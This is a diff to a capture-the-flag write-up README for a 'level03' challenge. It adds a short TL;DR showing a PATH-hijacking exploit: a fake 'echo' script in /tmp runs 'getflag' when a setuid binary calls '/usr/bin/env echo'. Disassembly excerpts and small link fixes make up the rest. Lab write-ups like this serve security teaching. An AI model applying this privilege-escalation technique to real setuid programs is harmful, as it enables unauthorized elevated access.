@@ -8,6 +8,17 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+echo -e '#!/bin/sh\ngetflag' > /tmp/echo
+chmod +x /tmp/echo
+PATH="/tmp:$PATH" ./level03
+```
+
+<br>
+
+
 ## Explanation:
 
 
@@ -54,7 +65,7 @@ objdump -s -d level03
 > ```
 > Stores the string `"/usr/bin/env echo Exploit me"` in the `.rodata` section starting at address `0x80485e0`.
 
-> ```
+> ```asm
 > 080484a4 <main>:
 >  80484a4:	55                   	push   %ebp
 >  80484a5:	89 e5                	mov    %esp,%ebp
@@ -118,4 +129,4 @@ PATH="/tmp:$PATH" ./level03
 
 ---
 
-[<<](/level02/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level04/resources/Readme.md)
+[<<](/level02/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level04/resources/Readme.md)
